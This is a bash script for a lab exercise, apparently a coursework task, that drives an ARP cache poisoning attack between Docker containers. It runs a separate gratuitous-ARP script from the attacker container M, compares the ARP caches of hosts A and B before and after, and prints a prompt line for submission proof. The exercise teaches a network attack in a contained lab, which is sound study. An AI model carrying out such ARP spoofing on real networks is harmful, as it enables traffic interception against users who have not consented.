#!/bin/bash
# Task 1.C -- ARP cache poisoning using a gratuitous ARP (broadcast, from M).
set -u
cd "$(dirname "$0")" || exit 1

read -p "Enter weekly code (e.g. WK01-ASDK): " WK

wk() {
  local G=$'\033[01;32m' B=$'\033[01;34m' R=$'\033[00m'
  local PROMPT_DIRTRIM; PROMPT_DIRTRIM=$(sed -n 's/^[[:space:]]*PROMPT_DIRTRIM=\([0-9]\+\).*/\1/p' ~/.bashrc 2>/dev/null | tail -1)
  local w='\w'; w="${w@P}"
  printf '[%s]%s%s@%s%s:%s%s%s$ echo %s\n' "$(date +%D)" "$G" "$(whoami)" "$(hostname)" "$R" "$B" "$w" "$R" "$WK"
  echo "$WK"
}

docker exec A-10.9.0.5 ping -c 1 10.9.0.6 >/dev/null 2>&1
docker exec B-10.9.0.6 ping -c 1 10.9.0.5 >/dev/null 2>&1
echo "A's and B's ARP caches before attack (real MACs):"
docker exec A-10.9.0.5 arp -n; echo; docker exec B-10.9.0.6 arp -n

echo
echo "M broadcasts a gratuitous ARP (10.9.0.5 is at M's MAC):"
docker exec -i M-10.9.0.105 python3 - < arp_gratuitous.py

echo
echo "Caches after attack (10.9.0.5 should now be M's MAC 02:42:0a:09:00:69 where an entry existed):"
docker exec A-10.9.0.5 arp -n; echo; docker exec B-10.9.0.6 arp -n
wk
